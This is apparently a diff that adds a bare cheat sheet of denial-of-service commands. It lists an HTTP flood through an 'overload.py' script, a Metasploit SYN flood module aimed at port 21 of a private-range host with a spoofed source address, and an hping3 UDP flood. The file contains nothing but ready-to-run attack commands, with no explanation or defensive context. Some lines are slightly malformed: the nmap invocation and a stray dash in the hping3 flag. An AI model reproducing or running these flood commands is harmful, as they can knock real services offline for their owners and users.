@@ -1,0 +1,17 @@
+HTTP FLOOD 
+
+	python3 overload.py --time 5000 --threads 10000 --target http://192.168.255.129/ --method HTTP
+
+SYN FLOOD
+
+	nmap 21 192.168.255.129
+	msfconsole 
+	use auxiliary/dos/tcp/synflood
+	set RHOST 192.168.255.129
+	set RPORT 21
+	set SHOST 10.0.0.1
+	exploit
+
+
+UDP FLOOD
+	hping3 -2 -–flood 192.168.255.129
